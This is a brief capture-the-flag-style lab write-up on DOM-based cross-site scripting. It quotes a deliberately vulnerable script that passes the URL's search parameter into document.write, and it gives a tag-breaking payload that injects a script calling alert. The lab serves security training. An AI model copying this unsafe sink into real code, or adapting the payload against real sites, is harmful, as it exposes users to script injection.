
# DOM XSS in document.write sink using source location.search

This lab demonstrates DOM-based XSS in search tracking: data from the URL's search parameter reaches a JavaScript sink. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function.

---------------------------------------------

References:

- https://portswigger.net/web-security/cross-site-scripting/dom-based

---------------------------------------------


The search page accepts its query through the `/?search=` parameter:



**Pic 1**

The relevant source code shows the sink where the URL-controlled value is written:

```
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```



**Pic 2**

The following payload triggers the alert in this lab:

```
"><script>alert(1)</script>
```




**Pic 3**
